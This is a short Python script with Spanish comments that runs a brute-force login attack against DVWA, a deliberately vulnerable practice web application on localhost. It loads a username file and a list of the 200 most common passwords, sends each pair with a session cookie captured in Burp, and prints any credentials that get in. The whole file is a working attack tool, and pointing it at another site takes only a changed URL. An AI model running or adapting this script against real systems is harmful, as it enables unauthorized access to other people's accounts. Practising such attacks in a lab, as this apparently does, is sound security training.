import requests

# URL del formulario de login de DVWA (ajusta el puerto si es distinto)
url = 'http://localhost:8080/vulnerabilities/brute/'

# Headers basados en la captura de Burp
headers = {
    'Host': 'localhost:8080',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'es-ES,es;q=0.9',
    'Referer': 'http://localhost:8080/vulnerabilities/brute/',
    'Cookie': 'PHPSESSID=7c94922a8fce407024d5c9438fb33525; security=low',
    'Connection': 'keep-alive'
}

# Cargar usuarios desde archivo
with open('usuarios.txt', 'r') as f:
    usuarios = [line.strip() for line in f if line.strip()]

# Cargar contraseñas desde archivo
with open('200_contrasenas_mas_usadas.txt', 'r') as f:
    contrasenas = [line.strip() for line in f if line.strip()]

# Ataque de fuerza bruta
for user in usuarios:
    for passwd in contrasenas:
        params = {
            'username': user,
            'password': passwd,
            'Login': 'Login'
        }

        response = requests.get(url, headers=headers, params=params)

        if "Welcome to the password protected area" in response.text:
            print(f'[+] Éxito: Usuario: {user} | Contraseña: {passwd}')
        #else:
            #print(f'[-] Falló: Usuario: {user} | Contraseña: {passwd}')